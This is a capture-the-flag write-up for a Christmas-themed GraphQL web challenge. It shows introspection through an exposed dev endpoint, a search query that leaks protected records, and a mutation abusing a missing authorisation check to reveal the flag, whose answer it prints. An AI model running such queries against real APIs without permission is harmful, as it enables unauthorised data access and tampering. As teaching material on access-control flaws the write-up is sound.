# Naughty or Nice - CTF Challenge

**Category:** Web Exploitation  
**Difficulty:** Easy-Medium  

## 📥 Download Challenge

**[Download NaughtyOrNice.zip](./NaughtyOrNice.zip)** - Try to solve it yourself before reading the writeup!

---

## **Challenge Overview:**

- **Challenge Name**: Naughty or Nice
- **Category**: Web Exploitation
- **Difficulty**: **Easy-Medium**
- **Description**:  
  In this challenge, players assume the role of an elf working for Santa Claus. Their task is to manage children who are either on the "Naughty", "Nice", or "Review" list. One child, **Santa Claus**, has a **VIP** status that protects his data. The goal of the challenge is to exploit security vulnerabilities in the system to retrieve Santa's **sanction letter**, which contains the flag.

---

## **Steps to Solve**

### **Step 1: Log in as an Elf**
The first step is to log in as an elf. The system uses **cookies** to track the logged-in elf. Players can log in by accessing one of the following URLs:

- `GET /login/1` → Logs in **Buddy** (Elf)
- `GET /login/2` → Logs in **Jingles** (Elf)
- `GET /login/99` → Logs in **Chief** (Admin)

Once logged in, the server sets a cookie (`elf_id`) in the browser, allowing further interaction with the API.

**Expected Result:**  
You will receive a message indicating successful login, with a hint about Santa being marked as **VIP** and **protected**.

---

### **Step 2: Discover the Backdoor Endpoint**

Upon logging in, access the **/dev/graphql** endpoint:

```
http://localhost:4000/dev/graphql
```

This endpoint has **GraphiQL** enabled, allowing for easy exploration of the GraphQL API. Unlike the **/graphql** endpoint, which disables introspection, the **/dev/graphql** endpoint allows introspection and exploration of the schema.

**Expected Result:**  
You will be able to interact with the GraphQL API using GraphiQL.

---

### **Step 3: Explore the GraphQL Schema**

Use the **introspection query** to retrieve information about the available types, queries, and mutations in the schema.

```graphql
query Introspection {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields { name }
    }
  }
}
```

The introspection query will reveal:

- **Queries**:
  - `me`: Returns the logged-in elf's data.
  - `myChildren`: Returns the children assigned to the elf.
  - `searchChild`: Allows searching for children by name or status.
  - `childById`: Retrieves child data by ID.
- **Mutations**:
  - `updateChildStatus`: Updates the status of a child.

---

### **Step 4: Search for Santa Claus**

The `searchChild` query has a **vulnerability**: it always includes children with the status of **VIP** in the search results, regardless of the query input.

```graphql
query {
  searchChild(name: "") {
    id
    name
    status
    privateNotes
    sanctionLetter
  }
}
```

This query will return all children, including **Santa Claus** (who is marked as **VIP**). Although his **sanctionLetter** is initially `null`, we can still retrieve his data.

**Expected Result:**  
The response will include **Santa Claus** as part of the results, with his **privateNotes** visible but **sanctionLetter** set to `null`.

---

### **Step 5: Exploit the Vulnerability**

The `updateChildStatus` mutation has a **critical vulnerability**. There are **no checks** to verify if the logged-in elf is authorized to modify the status of a child. This means **any elf can modify the status of any child**, including **Santa Claus**.

The mutation is as follows:

```js
updateChildStatus: ({ id, status }, context) => {
  const elf = requireElf(context); // Requires a logged-in elf.
  const child = findChildById(id);
  if (!child) {
    throw new Error('Child not found');
  }

  // No role or ownership check – **any elf** can change any child's status.
  child.status = status;

  return serializeChild(child);
}
```

Since there is no role-based access control (RBAC), any elf can update **Santa’s status** to `"NAUGHTY"`, thus exposing his **sanctionLetter**.

#### **Exploit: Change Santa’s Status to `NAUGHTY`**

Execute the following mutation:

```graphql
mutation {
  updateChildStatus(id: "20251225", status: NAUGHTY) {
    id
    name
    status
  }
}
```

**Expected Result:**  
The response should show **Santa Claus** with the updated `status: NAUGHTY`.

---

### **Step 6: Retrieve the Flag**

After changing Santa’s status to **NAUGHTY**, run the `searchChild` query again:

```graphql
query {
  searchChild(name: "") {
    id
    name
    status
    sanctionLetter
  }
}
```

This time, **Santa’s** **sanctionLetter** is exposed:

```json
{
  "id": "20251225",
  "name": "Santa Claus",
  "status": "NAUGHTY",
  "sanctionLetter": "KIB{n0rth_p0l3_9r4phql_h1j4ck}"
}
```

The **sanction letter** contains the flag: `KIB{n0rth_p0l3_9r4phql_h1j4ck}`.

---

## **Vulnerabilities Exploited**

### 1. **Missing Ownership/Role Checks**

- The `updateChildStatus` mutation does not enforce ownership or role-based access control. Any logged-in elf can modify the status of any child, including **Santa Claus**.

### 2. **Insecure Search Functionality**

- The `searchChild` query includes children with a **VIP** status, such as **Santa Claus**, regardless of the search term. This allows the player to discover **Santa's** sensitive data easily.


